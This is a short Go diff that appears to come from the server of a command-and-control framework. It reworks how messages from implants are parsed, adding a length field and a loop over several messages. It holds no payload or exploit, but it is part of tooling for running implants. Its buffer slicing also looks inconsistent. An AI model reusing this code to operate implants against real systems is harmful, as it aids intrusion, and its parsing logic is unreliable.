@@ -86,6 +86,7 @@ func (h *HexaneConfig) HandleCommand(Parser *Message, Stream *Stream) {
 func ParseMessage(body []byte) ([]byte, error) {
 	var (
 		err     error
+		Offset  uint32
 		Parser  *Message
 		implant *HexaneConfig
 		stream  = new(Stream)
@@ -100,16 +101,15 @@ func ParseMessage(body []byte) ([]byte, error) {
 		Parser.PeerId = Parser.ParseDword()
 		Parser.TaskId = Parser.ParseDword()
 		Parser.MsgType = Parser.ParseDword()
+		Parser.Length = Parser.ParseDword()
 
-		fmt.Printf("peer id: %d\n", Parser.PeerId)
-		fmt.Printf("task id: %d\n", Parser.TaskId)
-		fmt.Printf("message type: %d\n", Parser.MsgType)
+		Parser.Buffer = body[Parser.Length:]
 
 		if implant = GetConfigByPeerId(Parser.PeerId); implant != nil {
 
 			WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", Parser.PeerId))
 			implant.TaskCounter++
-		
+
 			switch Parser.MsgType {
 			case TypeCheckin:
 				{
@@ -143,6 +143,13 @@ func ParseMessage(body []byte) ([]byte, error) {
 		} else {
 			WrapMessage("ERR", "could not find peer in the database")
 			stream.Buffer = []byte("ok")
+		}
+
+		if len(body) >= int(Parser.Length) {
+			Offset += Parser.Length + 16
+			body = body[Offset:]
+		} else {
+			body = nil
 		}
 	}
 
